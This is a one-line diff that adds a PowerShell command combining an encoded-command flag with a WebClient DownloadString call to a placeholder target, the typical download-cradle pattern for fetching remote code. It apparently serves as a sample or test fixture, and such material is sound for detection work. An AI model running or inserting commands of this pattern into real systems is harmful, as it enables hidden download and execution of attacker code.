@@ -1,0 +1,1 @@
+powershell -enc AAAA; (New-Object Net.WebClient).DownloadString('x')
